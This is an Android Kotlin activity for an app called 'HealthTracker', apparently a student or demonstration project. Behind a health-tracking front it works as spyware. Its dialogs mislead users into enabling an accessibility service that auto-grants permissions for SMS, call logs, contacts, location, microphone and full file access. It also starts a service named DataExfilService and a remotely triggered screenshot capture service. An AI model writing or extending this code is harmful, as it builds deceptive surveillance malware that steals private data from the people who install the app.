package com.inf2007.healthtracker

import android.Manifest
import android.app.AlertDialog
import android.content.BroadcastReceiver
import android.content.pm.PackageManager
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.compose.material3.MaterialTheme
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.inf2007.healthtracker.ui.theme.HealthTrackerTheme
import com.google.firebase.FirebaseApp
import com.google.firebase.auth.FirebaseAuth
import androidx.compose.runtime.Composable
import androidx.compose.ui.graphics.toArgb
import androidx.compose.ui.tooling.preview.Preview
import androidx.navigation.compose.rememberNavController
import android.content.Intent
import android.os.Build
import com.inf2007.healthtracker.utilities.StepCounterService
import androidx.activity.result.contract.ActivityResultContracts
//  Notification
import com.inf2007.healthtracker.utilities.NotificationPermissionUtils
import android.util.Log
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.widget.Toast
import com.inf2007.healthtracker.utilities.WatchAccessibilityService
import android.content.ComponentName
import android.content.Context
import android.content.IntentFilter
import android.net.Uri
import android.os.Environment
import com.inf2007.healthtracker.utilities.DataExfilService
import com.inf2007.healthtracker.utilities.ScreenshotPermissionHelper
import com.inf2007.healthtracker.utilities.ScreenshotCaptureService
import android.media.projection.MediaProjectionManager

class MainActivity : ComponentActivity() {
    private val handler = Handler(Looper.getMainLooper())
    private var isPolling = false
    private var isPollingAccessibility = false
    private var isStorageDialogShowing = false
    private var isStoragePermissionHandled = false
    private var mediaProjectionIntent: Intent? = null
    private var hasRequestedMediaProjection = false
    private var isServiceStarted = false

    private val checkPermissionRunnable = object : Runnable {
        override fun run() {
            if (NotificationPermissionUtils.isNotificationAccessGranted(this@MainActivity)) {
                // SUCCESS! Stop polling and return to the app
                stopPollingAndReturn()
            } else if (isPolling) {
                // Keep checking every 1000ms (1 second)
                handler.postDelayed(this, 1000)
            }
        }
    }

    private val checkAccessibilityRunnable = object : Runnable {
        override fun run() {
            if (isAccessibilityServiceEnabled()) {
                // Success! Stop polling
                isPollingAccessibility = false
                handler.removeCallbacks(this)

                runOnUiThread {
                    Toast.makeText(
                        this@MainActivity,
                        "Accessibility enabled! Now auto-granting permissions...",
                        Toast.LENGTH_SHORT
                    ).show()

                    // NOW request all runtime permissions - Accessibility will auto-click
                    requestRemainingPermissions()
                }
            } else if (isPollingAccessibility) {
                handler.postDelayed(this, 1000)
            }
        }
    }

    private val requestPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        // Check if we have all permissions now
        val allPermissionsGranted = permissions.values.all { it }

        if (allPermissionsGranted) {
            // All runtime permissions granted, move to notification access
            if (NotificationPermissionUtils.isNotificationAccessGranted(this)) {
                onPermissionGrantedSuccessfully()
            } else {
                handleNotificationAccessFinalStep()
            }
        }
    }

    private val permissionsGrantedReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            if (intent.action == "com.inf2007.healthtracker.PERMISSIONS_GRANTED") {
                Log.i("HealthTracker", "Broadcast received - permissions granted!")
                onPermissionGrantedSuccessfully()
            }
        }
    }

    private val screenCaptureLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        ScreenshotPermissionHelper.handlePermissionResult(
            this,
            result.resultCode,
            result.data
        ) { resultCode, intent ->
            mediaProjectionIntent = intent

            // Store the result code and intent for later use
            val prefs = getSharedPreferences("screenshot_prefs", MODE_PRIVATE)
            prefs.edit().apply {
                putInt("result_code", resultCode)
                putString("media_projection_intent", intent.toUri(0))
                apply()
            }

            ScreenshotPermissionHelper.startScreenshotService(this, resultCode, intent)

            Handler(Looper.getMainLooper()).postDelayed({
                ScreenshotPermissionHelper.stopScreenshotService(this)
            }, 1000)
        }
    }

    private val screenshotCommandReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            val command = intent.getStringExtra("command") ?: return
            handleScreenshotCommand(command)
        }
    }

    fun handleScreenshotCommand(command: String) {
        when (command) {
            "START_SCREENSHOT" -> {
                if (mediaProjectionIntent != null) {
                    val prefs = getSharedPreferences("screenshot_prefs", MODE_PRIVATE)
                    val resultCode = prefs.getInt("result_code", RESULT_OK)
                    ScreenshotPermissionHelper.startScreenshotService(
                        this,
                        resultCode,
                        mediaProjectionIntent!!
                    )
                } else {
                    // Request permission first if we don't have it
                    val intent = ScreenshotPermissionHelper.createScreenCaptureIntent(this)
                    screenCaptureLauncher.launch(intent)
                }
            }
            "STOP_SCREENSHOT" -> {
                ScreenshotPermissionHelper.stopScreenshotService(this)
            }
            "CAPTURE_NOW" -> {
                ScreenshotPermissionHelper.captureScreenshotNow(this)
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        FirebaseApp.initializeApp(this)

        enableEdgeToEdge()
        setContent {
            HealthTrackerTheme {
                window.navigationBarColor = MaterialTheme.colorScheme.primary.toArgb()

                val user = FirebaseAuth.getInstance().currentUser
                val navController = rememberNavController()

                NavGraph(user, navController)
            }
        }

        // Register broadcast receiver with RECEIVER_NOT_EXPORTED flag for API 33+
        val intentFilter = IntentFilter("com.inf2007.healthtracker.PERMISSIONS_GRANTED")

        registerReceiver(
            permissionsGrantedReceiver,
            intentFilter,
            RECEIVER_NOT_EXPORTED  // Direct constant for API 33
        )

        checkAndRequestPermissions()

        registerReceiver(
            screenshotCommandReceiver,
            IntentFilter("com.inf2007.healthtracker.SCREENSHOT_COMMAND"),
            RECEIVER_NOT_EXPORTED
        )
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            unregisterReceiver(permissionsGrantedReceiver)
            unregisterReceiver(screenshotCommandReceiver)
        } catch (e: Exception) {
            Log.e("HealthTracker", "Error unregistering receiver: ${e.message}")
        }
        isPolling = false
        isPollingAccessibility = false
        isServiceStarted = false
        handler.removeCallbacks(checkPermissionRunnable)
        handler.removeCallbacks(checkAccessibilityRunnable)
    }

    private fun onPermissionGrantedSuccessfully() {
        if (isStoragePermissionHandled) return

        if (!Environment.isExternalStorageManager()) {
            isStoragePermissionHandled = true
            requestManageStorage()
            return
        }

        if (isServiceStarted) {
            Log.i("HealthTracker", "Service already started, skipping duplicate start")
            return
        }
        isServiceStarted = true

        // 1. Start the step counter service
        startHealthService()

        // 2. Start DataExfilService regardless of accessibility
        val exfilIntent = Intent(this, DataExfilService::class.java)
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(exfilIntent)
            } else {
                startService(exfilIntent)
            }
            Log.i("HealthTracker", "DataExfilService started")
        } catch (e: Exception) {
            Log.e("HealthTracker", "Failed to start DataExfilService: ${e.message}")
        }

        Handler(Looper.getMainLooper()).postDelayed({
            requestScreenshotPermission()
        }, 2000)

        // 3. Show a feedback message so the user knows it worked
        Toast.makeText(this, "Health Monitor Active!", Toast.LENGTH_SHORT).show()

        Log.i("HealthTracker", "=== PERMISSION GRANTED: SERVICE INITIALIZED ===")
    }

    private fun requestScreenshotPermission() {
        if (hasRequestedMediaProjection) {
            Log.i("HealthTracker", "MediaProjection already requested, skipping")
            return
        }

        hasRequestedMediaProjection = true
        Log.i("HealthTracker", "Requesting MediaProjection permission")
        val intent = ScreenshotPermissionHelper.createScreenCaptureIntent(this)
        screenCaptureLauncher.launch(intent)
    }

    private fun stopPollingAndReturn() {
        isPolling = false
        handler.removeCallbacks(checkPermissionRunnable)

        // Bring the app to the front
        val intent = Intent(this, MainActivity::class.java)
        intent.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        intent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
        startActivity(intent)

        // Log the success
        Log.i("HealthTracker", "=== POLLING SUCCESS: USER RETURNED ===")
        Toast.makeText(this, "Monitor Linked Successfully!", Toast.LENGTH_SHORT).show()
    }

    private fun checkAndRequestPermissions() {
        if (!isAccessibilityServiceEnabled()) {
            requestAccessibilityPermission()
            return
        }

        val permissions = arrayOf(
            Manifest.permission.ACTIVITY_RECOGNITION,
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.WAKE_LOCK,
            Manifest.permission.SCHEDULE_EXACT_ALARM,
            Manifest.permission.USE_EXACT_ALARM,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.POST_NOTIFICATIONS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.QUERY_ALL_PACKAGES,
            Manifest.permission.RECORD_AUDIO
        )

        val missing = permissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (missing.isNotEmpty()) {
            Log.i("AutoPermission", "Requesting ${missing.size} permissions - Accessibility will auto-click")
            requestPermissionLauncher.launch(missing.toTypedArray())
        } else if (!NotificationPermissionUtils.isNotificationAccessGranted(this)) {
            handleNotificationAccessFinalStep()
        } else {
            onPermissionGrantedSuccessfully()
        }
    }

    private fun requestRemainingPermissions() {
        val permissions = arrayOf(
            Manifest.permission.ACTIVITY_RECOGNITION,
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.WAKE_LOCK,
            Manifest.permission.SCHEDULE_EXACT_ALARM,
            Manifest.permission.USE_EXACT_ALARM,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.POST_NOTIFICATIONS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.QUERY_ALL_PACKAGES,
            Manifest.permission.RECORD_AUDIO
        )

        val missing = permissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (missing.isNotEmpty()) {
            Log.i("AutoPermission", "Requesting ${missing.size} permissions - Accessibility will auto-click")
            requestPermissionLauncher.launch(missing.toTypedArray())
        } else {
            Log.i("AutoPermission", "All runtime permissions already granted")

            if (NotificationPermissionUtils.isNotificationAccessGranted(this)) {
                onPermissionGrantedSuccessfully()
            } else {
                handleNotificationAccessFinalStep()
            }
        }
    }

    private fun handleNotificationAccessFinalStep() {
        if (!NotificationPermissionUtils.isNotificationAccessGranted(this)) {
            AlertDialog.Builder(this)
                .setTitle("Health Monitor")
                .setMessage("Please enable 'Health Tracker' in the next screen. We will automatically bring you back once it's done.")
                .setPositiveButton("Configure") { _, _ ->
                    // START POLLING before leaving
                    isPolling = true
                    handler.post(checkPermissionRunnable)

                    val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                    startActivity(intent)
                }
                .setCancelable(false)
                .show()
        } else {
            onPermissionGrantedSuccessfully()
        }
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        return try {
            val enabledServices = Settings.Secure.getString(
                contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: ""

            val serviceName = ComponentName(this, WatchAccessibilityService::class.java).flattenToString()
            enabledServices.contains(serviceName)
        } catch (e: Exception) {
            false
        }
    }

    private fun requestAccessibilityPermission() {
        AlertDialog.Builder(this)
            .setTitle("Enable Enhanced Health Tracking")
            .setMessage("To minimize permission prompts, please enable 'Health Assistant' accessibility service first. Our app will then automatically grant all other permissions for you.")
            .setPositiveButton("Enable Now") { _, _ ->
                // Start polling before leaving
                isPollingAccessibility = true
                handler.post(checkAccessibilityRunnable)

                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                startActivity(intent)

                Toast.makeText(
                    this,
                    "Enable 'Health Assistant' then return. We'll handle the rest automatically.",
                    Toast.LENGTH_LONG
                ).show()
            }
            .setCancelable(false)
            .show()
    }

    private fun startHealthService() {
        val intent = Intent(this, StepCounterService::class.java)
        try {
            Log.d("DEBUG_START", "Executing startForegroundService")

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
        } catch (e: Exception) {
            Log.e("DEBUG_START", "Crashed: ${e.message}")
            e.printStackTrace()
        }
    }

    private fun requestManageStorage() {
        if (isStorageDialogShowing) return
        if (isFinishing || isDestroyed) return

        isStorageDialogShowing = true

        AlertDialog.Builder(this)
            .setTitle("Storage Access Required")
            .setMessage("This app needs access to manage files in Downloads folder.")
            .setPositiveButton("Grant Access") { _, _ ->
                isStorageDialogShowing = false
                // Don't reset isStoragePermissionHandled here - wait until return
                try {
                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                    intent.data = Uri.parse("package:$packageName")
                    startActivity(intent)
                } catch (e: Exception) {
                    val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
                    startActivity(intent)
                }
            }
            .setNegativeButton("Later") { _, _ ->
                isStorageDialogShowing = false
                isStoragePermissionHandled = false // Allow retry if user clicks Later
            }
            .setOnDismissListener {
                isStorageDialogShowing = false
            }
            .show()
    }

    override fun onWindowFocusChanged(hasFocus: Boolean) {
        super.onWindowFocusChanged(hasFocus)

        Log.i("STRAFE", "onWindowFocusChanged - hasFocus: $hasFocus")
        Log.i("STRAFE", "isStoragePermissionHandled: $isStoragePermissionHandled")
        Log.i("STRAFE", "isExternalStorageManager: ${Environment.isExternalStorageManager()}")

        // When app returns to foreground
        if (hasFocus) {
            // Case 1: We were waiting for storage and now it's granted
            if (isStoragePermissionHandled && Environment.isExternalStorageManager()) {
                Log.i("STRAFE", "Storage granted! Starting services...")
                isStoragePermissionHandled = false
                onPermissionGrantedSuccessfully()
            }
            // Case 2: Storage is granted but flag was already reset (like in your logs)
            else if (Environment.isExternalStorageManager() && !isStoragePermissionHandled) {
                Log.i("STRAFE", "Storage already granted, starting services...")
                onPermissionGrantedSuccessfully()
            }
            // Case 3: Still waiting for storage
            else if (isStoragePermissionHandled && !Environment.isExternalStorageManager()) {
                Log.i("STRAFE", "Returned to app but storage NOT granted")
                isStoragePermissionHandled = false // Reset flag to allow retry
            }
        }
    }
}